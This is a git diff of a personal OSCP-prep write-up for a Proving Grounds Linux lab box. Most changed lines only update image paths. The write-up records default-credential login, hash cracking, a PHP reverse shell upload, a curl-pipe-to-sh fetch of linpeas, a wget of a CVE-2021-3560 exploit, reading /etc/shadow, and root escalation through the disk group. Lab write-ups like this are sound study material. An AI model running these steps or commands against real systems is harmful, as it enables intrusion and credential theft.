@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-08
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Intermediate
@@ -76,75 +77,75 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 No enumeration conducted
 ## Port 80 - HTTP (Apache)
 - Navigated to `http://192.168.137.16:80` and redirected to `http://192.168.137.16/wp-admin-setup-config.php`
-![[Pasted image 20241007200559.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007200559.png]]
 - Clicked "Let's go!" and setup Admin config
-![[Pasted image 20241007200736.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007200736.png]]
 - Error message received
-![[Pasted image 20241007200814.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007200814.png]]
 - Enumerated web directories with `gobuster` 
-![[Pasted image 20241007201438.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007201438.png]]
 - Identified `filemanager` directory & navigated to `http:192.168.137.16/filemanager`
-![[Pasted image 20241007201218.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007201218.png]]
 - Password guessed `admin:admin` credentials and logged into Admin panel
-![[Pasted image 20241007201309.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007201309.png]]
 - Clicked "OK" and identified `dora` user from new pop-up
-![[Pasted image 20241007201413.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007201413.png]]
 - Checked `filemanager/config/.htusers.php` and found `dora` password hash `$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS`
-![[Pasted image 20241007203309.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007203309.png]]
 - Ran `john` against password hash for `dora` and found credential `dora:doraemon`
-![[Pasted image 20241007203751.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007203751.png]]
 ---
 # Exploitation
 ## Name of the technique
 - Identified option to upload files to Admin dashboard
-![[Pasted image 20241007202007.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241007202007.png]]
 - Created PHP reverse shell file with `revshells.com` and saved file as `shell2.php`
-![[Pasted image 20241008161714.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008161714.png]]
 - Uploaded `shell2.php`, attempted to navigate to `192.168.137.16/filemanager/shell2.php` and caught reverse shell
-![[Pasted image 20241008161857.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008161857.png]]
 ---
 # Lateral Movement to user
 ## Local Enumeration
 - Upgraded to full shell, switched user with credentials `dora:doraemon`, then upgraded to full shell again
-![[Pasted image 20241008162333.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008162333.png]]
 - Navigated to `/home/dora` and printed file `local.txt`
-![[Pasted image 20241008162600.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008162600.png]]
 - Ran `cat /etc/passwd` to identify any other users & `cat /etc/shadow` to check access
-![[Pasted image 20241008162827.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008162827.png]]
 ---
 # Privilege Escalation
 ## Local Enumeration
 - Ran `sudo -l` to check sudo privileges for `dora`
-![[Pasted image 20241008162910.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008162910.png]]
 - Ran `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` to download and execute `LinPeas`
-![[Pasted image 20241008163706.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008163706.png]]
 - Identified by `LinPeas` as vulnerable to [CVE-2021-3560](https://github.com/UNICORDev/exploit-CVE-2021-3560)
-![[Pasted image 20241008163811.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008163811.png]]
 	- CVE-2021-3560 can be used to bypass polkitd credentials checks to elevate a user to `root`
 - Identified user `dora` is part of `disk` group
-![[Pasted image 20241008170025.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008170025.png]]
 	- Also ran `- find /dev -group disk` to check partitions owned by `disk`
-		![[Pasted image 20241008170348.png]]
+		![[Cybersecurity-Resources/images/Pasted image 20241008170348.png]]
 - Identified ssh config file
-![[Pasted image 20241008164637.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008164637.png]]
 - Identified interesting files modified in last 5 mins
-![[Pasted image 20241008164753.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008164753.png]]
 ## Privilege Escalation vector
 - Ran `wget https://raw.githubusercontent.com/UNICORDev/exploit-CVE-2021-3560/refs/heads/main/exploit-CVE-2021-3560.py` to copy exploit onto target
-![[Pasted image 20241008165101.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008165101.png]]
 - Ran `python3 exploit-CVE-2021-3560.py -u offsec -p pass` to attempt exploit creating user with credentials `offsec:pass`, then failed to install exploit dependency `gnome-control-center`
-![[Pasted image 20241008165258.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008165258.png]]
 - Ignored further investigation of `CVE-2021-3560`, and attempted escalation through `dora` user being member of `disk` group.
 - Ran `df -h` to identify available partitions, and identified `/dev/mapper/ubuntu--vg-ubuntu--lv` as likely partition for Ubuntu OS
-![[Pasted image 20241008171429.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008171429.png]]
 - Navigated to `/root` and printed `/root/proof.txt`
-![[Pasted image 20241008171715.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008171715.png]]
 - Ran `cat /etc/shadow` to print password hashes
-![[Pasted image 20241008172041.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008172041.png]]
 - Copied `root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::` into file and cracked hash with `john` for password `explorer`
-![[Pasted image 20241008172247.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008172247.png]]
 - Ran `su root` to switch to `root` user with password `explorer`, and ran `ifconfig` to confirm IP address
-![[Pasted image 20241008172618.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241008172618.png]]
 ---
 # Trophy & Loot
 `local.txt` = `3e1616c5b86c3e113681958a619f6794`
